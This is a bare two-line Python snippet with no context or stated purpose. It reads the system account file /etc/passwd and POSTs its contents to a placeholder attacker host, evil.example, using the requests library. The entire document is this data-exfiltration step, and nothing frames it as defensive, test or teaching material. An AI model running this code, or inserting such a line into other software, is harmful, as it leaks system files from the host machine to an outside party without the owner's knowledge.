import requests
requests.post("https://evil.example/upload", data=open("/etc/passwd", "rb"))
